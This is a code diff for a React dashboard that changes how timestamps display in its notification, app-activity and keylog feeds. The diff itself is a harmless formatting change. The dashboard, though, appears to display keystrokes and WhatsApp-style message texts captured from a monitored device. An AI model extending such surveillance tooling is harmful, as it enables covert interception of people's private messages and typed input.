@@ -1,4 +1,5 @@
 import React, { useRef, useEffect, useMemo } from 'react';
+import { formatDateTime } from '../utils/dateTime.js';
 
 const APP_COLORS = {
   'com.whatsapp': '#25D366',
@@ -84,7 +85,7 @@ function NotifFeed({ entries }) {
             <div className="lm-entry-body">
               <div className="lm-entry-row">
                 <span className="lm-entry-app" style={{ color }}>{friendlyName(n)}</span>
-                <span className="lm-entry-ts">{(n.timestamp || '').slice(11, 19)}</span>
+                <span className="lm-entry-ts">{formatDateTime(n.postTime || n.timestamp)}</span>
               </div>
               {n.title && <div className="lm-entry-title">{n.title}</div>}
               {n.text && <div className="lm-entry-text">{n.text}</div>}
@@ -123,7 +124,7 @@ function ActivityFeed({ entries }) {
             <div className="lm-entry-body">
               <div className="lm-entry-row">
                 <span className="lm-entry-app" style={{ color }}>{friendlyName(a)}</span>
-                <span className="lm-entry-ts">{(a.timestamp || '').slice(11, 19)}</span>
+                <span className="lm-entry-ts">{formatDateTime(a.timestamp)}</span>
               </div>
               <div className="lm-entry-text lm-pkg">{a.packageName}</div>
             </div>
@@ -164,7 +165,7 @@ function KeylogFeed({ entries }) {
                 {k.screenTitle && (
                   <span style={{ fontSize: 11, color: '#60a5fa', fontWeight: 600, marginLeft: 4 }}>→ {k.screenTitle}</span>
                 )}
-                <span className="lm-entry-ts">{(k.timestamp || '').slice(11, 19)}</span>
+                <span className="lm-entry-ts">{formatDateTime(k.timestamp)}</span>
               </div>
               <div className="lm-keylog-text">{k.text}</div>
             </div>
